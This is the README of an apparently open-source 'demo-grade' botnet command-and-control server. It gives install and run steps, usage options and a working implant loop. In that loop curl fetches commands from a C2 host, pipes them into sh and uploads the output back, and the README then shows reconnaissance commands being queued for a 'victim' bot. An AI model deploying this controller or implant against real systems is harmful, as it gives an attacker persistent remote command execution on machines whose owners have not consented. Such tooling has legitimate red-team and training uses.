demobotnetcontroller
====================
Demo-grade botnet controller

Features:
- Comms via HTTPS with a self-signed cert.
- Tasking and output via plaintext files.
- Bot-tracking via plaintext files' mtimes.
- Minimal documentation-caused confusion.
- Minimal distractions due to excessive (or any?) features.
- Exploit resistance via `pledge(2)` and `unveil(2)` (OpenBSD-only).
- Tests (probably mostly OpenBSD-only).
- ~Only tested~ Works well with curl in a loop.

For legal use only.

Quickstart
----------
1. Download/install
   ```sh
   go install github.com/magisterquis/demobotnetcontroller@latest
   ```
2. Start it going
   ```sh
   demobotnetcontroller -h # For good measure
   demobotnetcontroller
   ```
   We should see something like
   ```json
   {
           "time": "2025-10-31T01:52:03.556730378+01:00",
           "level": "INFO",
           "msg": "Server starting",
           "fingerprint": "Pj3k5tQFBQyDmXFeS79j2t/qU0WClx5qKI2DsaZn7AE=",
           "address": "127.0.0.1:4433",
           "PID": 62063,
           "directory": "demobotnet",
           "prefix": "/bots/"
   }
   ```
3. TLS is self-signed.  Use the fingerprint and URL prefix from the first log
   message to roll an HTTPS/shell something, e.g.
   ```sh
   while :; do
   ( curl \
           --insecure \
           --max-time 10 \
           --pinnedpubkey sha256//Pj3k5tQFBQyDmXFeS79j2t/qU0WClx5qKI2DsaZn7AE= \
           --silent \
           https://c2.example.com:4433/bots/$(hostname)-$$ |
   sh 2>&1 |
   curl \
           --insecure \
           --max-time 10 \
           --pinnedpubkey sha256//Pj3k5tQFBQyDmXFeS79j2t/qU0WClx5qKI2DsaZn7AE= \
           --silent \
           --upload-file - \
           https://c2.example.com:4433/bots/$(hostname)-$$ ) &
   sleep 10
   done
   ```
   Last element of the path is the Implant ID, in this case a hostname and the
   script's PID.

   When it first calls back, we should see something like
   ```json
    {
            "time": "2025-11-01T15:34:31.848009955+01:00",
            "level": "INFO",
            "msg": "New ID",
            "request": {
                    "remote_address": "10.135.2.240:39398",
                    "method": "PUT",
                    "host": "c2.example.com:4433",
                    "request_uri": "/bots/victim.com-1234",
                    "user_agent": "curl/8.14.1"
            },
            "id": "victim-1234"
    }
   ```
4. Tasking and output are in the directory in the first log message.  Output
   is in a file with the same name as Implant IDs.  Tasking goes in a file with
   the same name plus `_task`.
   ```sh
   # Be in the directory with tasking and output.
   cd demobotnet
   # Give it the the sort of tasking one should give a new bot.
   echo 'ps awwwfux; uname -a; id' >> victim.com-1234_task
   # Watch for output
   tail -f victim.com-1234
   ```

Usage
-----
```
Usage: demobotnetcontroller [options]

Demo-grade botnet controller.

- Comms over HTTP, GET for tasking, POST/PUT for output.
- URL path must have the right prefix, last component is bot ID.
- IDs must be [A-Za-z0-9-.]+
- Tasking goes into files named after the bots' IDs plus _task.
- Output will go to files named after the bots' IDs.
- TLS Fingerprint (for --pinnedpubkey) is in _tls_fingerprint.

Options:
  -debug
    	Enable debug logging
  -dir directory
    	Bot tasking/output directory (default "demobotnet")
  -listen address
    	Listen address (default "0.0.0.0:4433")
  -max-runtime duration
    	Maximum run duration
  -prefix string
    	HTTP URL path prefix for bots (default "/bots")
```
